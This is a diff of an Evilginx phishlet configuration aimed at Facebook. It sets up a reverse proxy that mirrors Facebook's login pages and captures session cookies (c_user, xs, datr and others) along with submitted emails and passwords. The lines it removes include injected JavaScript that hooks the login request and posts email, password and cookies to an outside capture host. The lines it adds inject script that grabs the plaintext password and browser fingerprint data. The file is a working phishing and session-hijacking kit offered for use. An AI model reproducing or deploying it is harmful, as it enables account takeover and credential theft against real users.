@@ -1,21 +1,58 @@
-author: 'evilginx-enhanced'
-min_ver: '3.0.0'
+author: '@charlesbel'
+min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
-  - {phish_sub: 'login', orig_sub: 'login', domain: 'facebook.com', session: true}
-  - {phish_sub: 'graph', orig_sub: 'graph', domain: 'facebook.com', session: true}
-  - {phish_sub: 'api', orig_sub: 'api', domain: 'facebook.com', session: false}
-  - {phish_sub: 'static', orig_sub: 'staticxx', domain: 'fbcdn.net', session: false}
-  - {phish_sub: 'connect', orig_sub: 'connect', domain: 'facebook.com', session: false}
-  - {phish_sub: 'web', orig_sub: 'web', domain: 'facebook.com', session: false}
-  - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', search: 'refsrc=deprecated', replace: '', mimes: ['*/*'], session: true}
-
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'xx.fbcdn.net', session: false, is_landing: false}
 sub_filters:
-  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'WebBloks', replace: '//WebBloks', mimes: ['application/javascript']}
-  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'www\.facebook\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'graph.facebook.com', orig_sub: 'graph', domain: 'facebook.com', search: 'graph\.facebook\.com', replace: '{hostname}', mimes: ['*/*']}
-  - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'static', domain: 'fbcdn.net', search: 'static\.xx\.fbcdn\.net', replace: '{hostname}', mimes: ['*/*']}
-  
+  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'www.facebook.com', orig_sub: 'static', domain: 'xx.fbcdn.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '2F{hostname}', replace: '2F{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '\\\\\\/\\\\\\/{hostname}', replace: '\\\\\\/\\\\\\/{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https:\/\/{hostname}\/', replace: 'https:\/\/{hostname}\/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'www', domain: 'facebook.com', search: ':"{domain}";', replace: ':"{domain}";', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: '.facebook.com'
+    keys: ['c_user', 'xs', 'sb', 'fr', 'datr', 'wd', 'spin']
+    secure: true
+    http_only: true
+    
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'unenc_password'
+    search: '(.*)'
+    type: 'post'
+  custom: 
+    - key: 'pass'
+      search: '(.*)'
+      type: 'post'
+    - key: 'Password'
+      search: '(.*)'
+      type: 'post'  
+    - key: 'UserAgent'
+      search: '(.*)'
+      type: 'post'
+    - key: 'Browser'
+      search: '(.*)'
+      type: 'post'
+    - key: 'Engine'
+      search: '(.*)'
+      type: 'post'
+    - key: 'Platform'
+      search: '(.*)'
+      type: 'post'
+
+   
+login:
+  domain: 'www.facebook.com'
+  path: '/login.php'
 
 response_headers:
   - name: 'X-Frame-Options'
@@ -23,98 +60,42 @@ response_headers:
   - name: 'Content-Security-Policy'
     value: "default-src 'self' 'unsafe-inline' *.facebook.com *.fbcdn.net"
 
-credentials:
-  username:
-    key: 'email'
-    search: '(.*)'
-    type: 'post'
-  password:
-    key: 'pass'
-    search: '(.*)'
-    type: 'post'
-  encrypted_payload:
-    key: 'enc_pass'
-    search: '(.*)'
-    type: 'post'
-  custom:
-  - key: 'jazoest'
-    search: '(.*)'
-    type: 'post'
-  - key: 'lsd'
-    search: '(.*)'
-    type: 'post'
-
-auth_tokens:
-  - domain: '.facebook.com'
-    keys: ['c_user', 'xs', 'sb', 'fr', 'datr', 'wd', 'spin']
-    secure: true
-    http_only: true
-
-session_capture:
-  force_redirect: '/'
-  cookie_domain: '.facebook.com'
-  secure_cookies: true
-  http_only_cookies: true
-  capture_on_redirect: true
-
-login:
-  domain: 'www.facebook.com'
-  path: '/login.php'
-  force_basic_auth: true
-
-host_mapping:
-  www.facebook.com: {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com'}
-  m.facebook.com: {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com'}
-
 js_inject:
   - trigger_domains: ["www.facebook.com"]
     trigger_paths: ["/login.php", "/login/device-based/regular/login/", "/login/*"]
-    inject_delay: 2000
-    cache_buster: true
-    script: |
-
-      window.onbeforeunload = null;
-      if (window.location.href.includes('refsrc=deprecated')) {
-        window.location.href = '/login.php'; 
+    trigger_params: []
+    script: |  
+      function onclickListener(){
+        var submit = document.querySelectorAll('button[type=submit]')[0];
+        submit.setAttribute("onclick", "sendPass()");
+        var useragent = navigator.userAgent;
+        xhr.open("POST", '/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("UserAgent="+encodeURIComponent(useragent));
+        var browser = navigator.appName;
+        xhr.open("POST", '/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("Browser="+encodeURIComponent(browser));
+        var engine = navigator.product;
+        xhr.open("POST", '/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("Engine="+encodeURIComponent(engine));
+        var platform = navigator.platform;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("Platform="+encodeURIComponent(platform));
+        return;
       }
-
-      // Bypass WebBloks validation
-      window.Bloks = {
-        validatePayload: function() { return true; },
-        parseTree: function() { return {}; }
-      };
-
-      // Debugging
-      console.log('Bloks status:', typeof Bloks, Bloks?.validatePayload);
-      Object.defineProperty(window, 'fb_web_bloks', {value: false});
-
-      function debug() {
-        console.log('loaded');
-      } // <- Missing brace added
-
-      // Intercept form submission
-      const origFetch = window.fetch;
-      window.fetch = function(url, options) {
-        if (url.includes('/login/') && options?.method === 'POST') {
-          const formData = new URLSearchParams(options.body);
-          if (formData.has('email') && formData.has('pass')) {
-            // Send credentials to capture endpoint
-            fetch('https://frontgate.live/capture', {
-              method: 'POST',
-              body: JSON.stringify({
-                email: formData.get('email'),
-                pass: formData.get('pass'),
-                cookies: document.cookie
-              }),
-              keepalive: true
-            });
-          }
-        }
-        return origFetch.apply(this, arguments);
-      };
-
-      // Backup: Form submission listener
-      document.addEventListener('submit', function(e) {
+      function sendPass(){
+        var password = document.getElementsByName("pass")[0].value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/login/device-based/regular/login/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("unenc_password="+encodeURIComponent(password));
+        return;
+      }
+       document.addEventListener('submit', function(e) {
         if (e.target.method === 'post' && e.target.action.includes('/login/')) {
           const email = e.target.querySelector('[name="email"]')?.value;
           const pass = e.target.querySelector('[name="pass"]')?.value;
@@ -133,3 +114,4 @@ js_inject:
           }
         }
       }, true); 
+      setTimeout(function(){ onclickListener(); }, 1000);
